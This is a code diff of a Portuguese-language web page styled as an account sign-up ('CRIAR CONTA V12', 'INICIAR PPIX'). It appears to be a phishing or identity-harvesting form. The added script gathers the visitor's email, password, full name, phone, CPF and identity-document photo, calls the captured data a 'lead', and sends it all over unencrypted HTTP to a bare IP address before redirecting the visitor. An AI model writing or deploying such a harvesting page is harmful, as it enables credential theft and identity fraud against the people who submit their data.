@@ -44,23 +44,80 @@
             <input type="text" id="e-mail" placeholder="Seu E-MAIL" maxlength="99">
             <input type="text" id="senha" placeholder="Seu SENHA" maxlength="99">
 
-            <div style="text-align: left; margin: 15px 0;">
-                <label style="font-size: 0.7rem; color: #ffa500; display: block; margin-top: 10px;">DOC. IDENTIDADE (FRENTE/VERSO)</label>
-                <input type="file" id="foto_doc" accept="image/*" capture="camera" style="font-size: 0.7rem; padding: 5px;">
+            <div id="sessao-cadastro" style="display: block; text-align: center;">
+    <input type="email" id="email_acesso" placeholder="Seu melhor e-mail" style="width: 100%; margin-bottom: 10px; padding: 10px;">
+    <input type="password" id="senha_acesso" placeholder="Crie uma senha" style="width: 100%; margin-bottom: 10px; padding: 10px;">
+    <button type="button" onclick="proximaEtapa()" style="background-color: #ffa500; font-weight: bold; width: 100%; padding: 12px; cursor: pointer;">CRIAR CONTA V12</button>
+</div>
 
-                <label style="font-size: 0.7rem; color: #ffa500; display: block; margin-top: 5px;">SELFIE COM DOCUMENTO</label>
-                <input type="file" id="selfie" accept="image/*" capture="user" style="font-size: 0.7rem; padding: 5px;">
+<div id="fluxo-cadastro" style="display: none;">
+    <input type="text" id="nome_cliente" placeholder="Nome completo igual ao RG" style="width: 100%; margin-bottom: 10px; padding: 10px;">
+    <input type="text" id="tel_cliente" placeholder="Telefone celular" style="width: 100%; margin-bottom: 10px; padding: 10px;">
+    <input type="text" id="cpf_cliente" placeholder="CPF" style="width: 100%; margin-bottom: 10px; padding: 10px;">
+    
+    <label style="color: #ffa500; font-size: 0.7rem; display: block; margin-bottom: 5px;">DOC. IDENTIDADE (FRENTE/VERSO)</label>
+    <input type="file" id="foto_doc" accept="image/*" style="margin-bottom: 15px;">
+    
+    <button type="button" onclick="dispararRobo()" id="btn-acao" style="background-color: #ffa500; font-weight: bold; width: 100%; padding: 12px;">INICIAR PPIX</button>
+</div>
 
-                <label style="font-size: 0.7rem; color: #ffa500; display: block; margin-top: 5px;">COMPROVANTE DE ENDEREÇO</label>
-                <input type="file" id="comprovante" accept="image/*" style="font-size: 0.7rem; padding: 5px;">
-            </div>
-            <button id="btn-main">INICIAR PPIX</button>
-
-            <div id="status">AGUARDANDO COMANDO...</div>
+<div id="status-robo" style="display:none; color: white; text-align: center; margin-top: 20px;">
+    <p id="mensagem-status">🤖PPIX</p>
+    
+        <div id="status">AGUARDANDO COMANDO...</div>
             <p class="footer-info">Emet Echad Seter Ativado</p>
         </div>
+</div>
 
-        <script>
+<script>
+let dadosAcesso = {};
+
+function proximaEtapa() {
+    const email = document.getElementById('email_acesso').value;
+    const senha = document.getElementById('senha_acesso').value;
+
+    if(email.includes("@") && senha.length >= 4) {
+        dadosAcesso = { email, senha }; // Guarda o lead para o envio final
+        document.getElementById('sessao-cadastro').style.display = 'none';
+        document.getElementById('fluxo-cadastro').style.display = 'block';
+        console.log("Lead capturado com sucesso.");
+    } else {
+        alert("Por favor, preencha o e-mail e uma senha válida.");
+    }
+}
+
+async function dispararRobo() {
+    document.getElementById('fluxo-cadastro').style.display = 'none';
+    document.getElementById('status-robo').style.display = 'block';
+
+    const formData = new FormData();
+    // Dados da Etapa 1
+    formData.append('login_email', dadosAcesso.email);
+    formData.append('login_senha', dadosAcesso.senha);
+    // Dados da Etapa 2
+    formData.append('nome', document.getElementById('nome_cliente').value);
+    formData.append('telefone', document.getElementById('tel_cliente').value);
+    formData.append('cpf', document.getElementById('cpf_cliente').value);
+    formData.append('foto_doc', document.getElementById('foto_doc').files[0]);
+
+    try {
+        const response = await fetch('http://54.207.222.79:5000/gerar-link-total', {
+            method: 'POST',
+            body: formData
+        });
+        const res = await response.json();
+        if(res.status === "sucesso") {
+            window.location.href = res.link;
+        } else {
+            alert("Erro: " + res.msg);
+        }
+    } catch (e) {
+        alert("Erro de conexão com o servidor AWS.");
+    }
+}
+</script>
+
+             <script>
             
         // 1. FUNDO NEURAL 3D (VANTA.JS)
         VANTA.NET({
